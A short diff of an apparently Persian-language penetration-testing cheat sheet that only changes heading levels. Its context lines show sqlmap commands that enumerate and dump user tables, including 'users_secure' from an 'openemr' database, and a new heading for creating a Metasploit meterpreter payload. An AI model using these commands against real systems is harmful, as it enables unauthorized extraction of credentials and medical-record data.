@@ -477,20 +477,20 @@ sqlmap.py -u "http:// url " --data="id=l&str=val" -p "id" --columns -T
 "users"
 ```
 
-## خواندن از فایل 
+### خواندن از فایل 
 
 ```text
 sqlmap.py -r req.txt
 ```
 
-## دریافت رکورد های جدول مشخص از پایگاه داده مشخص
+### دریافت رکورد های جدول مشخص از پایگاه داده مشخص
 
 ```text
 sqlmap -r req -D openemr -T users_secure --dump
 
 ```
 
-
+## msf
 
 
 ### ایجاد پیلود meterpreter  \(برای لینوکس: -t file -o callback\)
